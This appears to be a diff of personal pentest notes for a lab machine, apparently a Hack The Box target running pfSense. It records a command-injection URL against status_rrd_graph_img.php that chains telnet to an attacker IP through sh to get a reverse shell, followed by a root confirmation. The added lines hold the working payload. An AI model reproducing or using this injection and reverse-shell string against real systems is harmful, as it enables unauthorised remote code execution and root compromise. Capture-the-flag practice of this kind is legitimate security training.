@@ -61,4 +61,10 @@ Test is both commands get executed
 https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.15.41+80+|+telnet+10.10.15.41+445
 both commands get executed, but connection fails med det samme. 
 all three ?
-https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.15.41+80+|+bash+|+telnet+10.10.15.41+445
+works to get shell
+https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.14.236+80+|+sh+|+telnet+10.10.14.236+443
+
+
+Now to get ROOT:
+id: root
+DONE :) 
